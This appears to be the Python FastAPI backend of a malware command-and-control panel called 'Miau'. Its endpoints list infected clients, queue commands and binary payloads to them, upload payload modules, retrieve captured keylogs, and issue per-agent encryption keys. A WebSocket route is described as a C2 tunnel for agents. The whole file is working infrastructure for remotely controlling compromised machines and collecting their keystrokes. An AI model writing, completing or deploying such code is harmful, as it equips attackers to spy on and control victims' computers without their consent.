"""FastAPI REST backend for the Miau WPF panel.

Endpoints:
    POST /api/auth/login   -> login + TOTP -> JWT
    GET  /api/clients      -> list clients
    GET  /api/client/{id}  -> one client + recent commands
    POST /api/client/{id}/cmd  -> enqueue command
    GET  /api/command/{id}/resp-> response for command
    GET  /api/stats        -> store stats
    GET  /api/modules      -> list stored modules
    POST /api/modules      -> upload module
    GET  /api/keylogs/{token}
    POST /api/tokens       -> create token (keygen)
    GET  /api/tokens       -> list tokens
    POST /api/tokens/{token}/revoke
"""
from __future__ import annotations

import base64
import binascii
import hmac
import time
from typing import Any

import pyotp
import uvicorn
from fastapi import Depends, FastAPI, Header, HTTPException, WebSocket
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import FileResponse
from pathlib import Path
from pydantic import BaseModel, Field

import keygen
from config import Config, default as get_cfg
from store import Store

app = FastAPI(title="Miau Panel API", version="1.0")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

_cfg: Config | None = None
_store: Store | None = None


def cfg() -> Config:
    global _cfg
    if _cfg is None:
        _cfg = get_cfg()
    return _cfg


def store() -> Store:
    global _store
    if _store is None:
        _store = Store(cfg().store.db_path)
    return _store


# ---------------------------------------------------------------------------
# auth helpers (operator password + TOTP)
# ---------------------------------------------------------------------------

def _operator_secret() -> str:
    # In production this is generated once and stored in config/db.
    # For the skeleton we derive from config auth section.
    seed = cfg().auth.totp_issuer
    return base64.b32encode(seed.encode()).decode().rstrip("=")


def _check_operator(pw: str, totp: str) -> bool:
    expected_pw = getattr(cfg().auth, "operator_password", "miau")
    pw_ok = hmac.compare_digest(pw, expected_pw)
    totp_ok = pyotp.TOTP(_operator_secret(), digits=cfg().auth.totp_digits,
                         interval=cfg().auth.totp_interval).verify(totp)
    return pw_ok and totp_ok


def _require_auth(x_panel_pw: str = Header(""), x_panel_totp: str = Header("")) -> None:
    if not _check_operator(x_panel_pw, x_panel_totp):
        raise HTTPException(status_code=401, detail="auth failed")


# ---------------------------------------------------------------------------
# models
# ---------------------------------------------------------------------------

class LoginReq(BaseModel):
    password: str
    totp: str


class CmdReq(BaseModel):
    cmd_type: str
    args: str = ""
    blob: str = Field("", description="base64 encoded bytes")


class ModuleReq(BaseModel):
    name: str
    version: str = "1.0"
    entry: str = "run"
    binary_b64: str


class TokenReq(BaseModel):
    label: str = ""


# ---------------------------------------------------------------------------
# endpoints
# ---------------------------------------------------------------------------

@app.post("/api/auth/login")
def login(req: LoginReq):
    if not _check_operator(req.password, req.totp):
        raise HTTPException(status_code=401, detail="bad login or totp")
    return {"ok": True, "token": "panel-jwt-stub", "expires": time.time() + 3600}


@app.get("/api/health")
def health():
    return {"status": "ok", "ts": time.time()}


@app.get("/api/clients", dependencies=[Depends(_require_auth)])
def clients():
    rows = store().list_clients()
    for r in rows:
        r["online"] = r["state"] == "ONLINE"
    return {"clients": rows}


@app.get("/api/client/{cid}", dependencies=[Depends(_require_auth)])
def client_detail(cid: str):
    st = store()
    c = st.get_client(cid)
    if not c:
        raise HTTPException(404, "client not found")
    cmds = st.get_commands_for_client(c["token"])
    return {"client": c, "commands": cmds}


@app.post("/api/client/{cid}/cmd", dependencies=[Depends(_require_auth)])
def enqueue(cid: str, req: CmdReq):
    st = store()
    c = st.get_client(cid)
    if not c:
        raise HTTPException(404, "client not found")
    blob = b""
    if req.blob:
        try:
            blob = base64.b64decode(req.blob)
        except binascii.Error:
            raise HTTPException(400, "bad blob")
    cmd_id = st.enqueue_command(c["token"], req.cmd_type, req.args, blob)
    return {"cmd_id": cmd_id}


@app.get("/api/command/{cmd_id}/resp", dependencies=[Depends(_require_auth)])
def command_resp(cmd_id: int):
    st = store()
    resp = st.get_response(cmd_id)
    if resp is None:
        rows = st._conn.execute(
            "SELECT * FROM responses WHERE cmd_id=? ORDER BY id DESC LIMIT 1",
            (cmd_id,),
        ).fetchone()
        resp = dict(rows) if rows else None
    if not resp:
        return {"pending": True}
    data = resp["data"]
    return {
        "status": resp["status"],
        "message": resp["message"],
        "data_b64": base64.b64encode(data).decode() if data else "",
        "final": resp["final"],
    }


@app.get("/api/stats", dependencies=[Depends(_require_auth)])
def stats():
    return store().stats()


@app.get("/api/modules", dependencies=[Depends(_require_auth)])
def list_modules():
    rows = store().list_modules()
    out = []
    for r in rows:
        r = dict(r)
        r["size"] = len(r.get("binary") or b"")
        r["binary"] = None
        out.append(r)
    return {"modules": out}


@app.post("/api/modules", dependencies=[Depends(_require_auth)])
def add_module(req: ModuleReq):
    try:
        binary = base64.b64decode(req.binary_b64)
    except binascii.Error:
        raise HTTPException(400, "bad base64")
    store().upsert_module(req.name, req.version, binary, req.entry)
    return {"ok": True}


@app.get("/api/keylogs/{token}", dependencies=[Depends(_require_auth)])
def keylogs(token: str, limit: int = 500):
    return {"keylogs": store().list_keylogs(token, limit)}


@app.post("/api/tokens", dependencies=[Depends(_require_auth)])
def create_token(req: TokenReq):
    token, keyhex, label = _gen_one(req.label)
    return {"token": token, "aes_key_hex": keyhex, "label": label}


def _gen_one(label: str) -> tuple[str, str, str]:
    import os as _os
    import secrets
    token = keygen.new_token()
    key = _os.urandom(32)
    store().add_token(token, key, label or "default")
    return token, key.hex(), label or "default"


@app.get("/api/tokens", dependencies=[Depends(_require_auth)])
def list_tokens():
    rows = store().list_tokens()
    for r in rows:
        r["aes_key"] = None
    return {"tokens": rows}


@app.post("/api/tokens/{token}/revoke", dependencies=[Depends(_require_auth)])
def revoke_token(token: str):
    store().revoke_token(token)
    return {"ok": True}


# ---------------------------------------------------------------------------
# DCT - Domain C2 Tunneling over WebSocket
# ---------------------------------------------------------------------------

@app.websocket("/dct/{token_hint}")
async def dct_tunnel(websocket: WebSocket, token_hint: str):
    """WebSocket C2 tunnel endpoint. Agent connects here for DCT mode."""
    from dct_tunnel import DctTunnel
    tunnel = DctTunnel(cfg(), store(), websocket, token_hint)
    await tunnel.run()


# ---------------------------------------------------------------------------
# Static Panel
# ---------------------------------------------------------------------------

PANEL_DIR = Path(__file__).resolve().parent.parent / "panel"

@app.get("/")
async def panel():
    """Serve the web panel."""
    return FileResponse(str(PANEL_DIR / "panel.html"))


def main() -> None:
    import argparse
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="0.0.0.0")
    ap.add_argument("--port", type=int, default=None)
    args = ap.parse_args()
    c = cfg()
    port = args.port or c.server.api_port
    uvicorn.run(app, host=args.host, port=port, ssl_keyfile=None)


if __name__ == "__main__":
    main()
